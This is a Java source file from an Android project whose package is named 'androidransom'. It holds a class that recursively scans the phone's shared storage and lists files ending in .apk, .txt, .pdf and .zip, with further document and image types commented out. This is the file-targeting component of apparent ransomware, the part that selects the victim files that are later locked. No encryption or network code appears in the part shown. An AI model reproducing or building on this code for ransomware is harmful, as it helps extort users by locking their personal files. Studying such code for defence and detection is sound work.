package bycracks.androidransom;

import android.os.Environment;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by ByeongCheol on 2017-06-25.
 */

public class SearchFiles {
    String[] ext = {".apk", ".txt", ".pdf", ".zip"/*, ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
    ArrayList<File> fileList;
    ArrayList <String> fileNames;

    public SearchFiles() {
        fileList = new ArrayList<File>();
        fileNames = new ArrayList<String>();
    }

    public File getTopDir() {
        String rootSD = Environment.getRootDirectory().toString();
        return new File(rootSD + "/../storage/emulated/0/");
    }

    // 파일 검색
    public void searchAllFile(File topDir){
        File[] files = topDir.listFiles();
        if (files == null) return;

        for(File inFile : files) {
            if (inFile.isDirectory()) {
                searchAllFile(inFile);
            }
            for (String list : ext)
                if (inFile.getName().endsWith(list)) {
                    fileNames.add(inFile.getName());
                    fileList.add(inFile);
                }

        }
    }
}
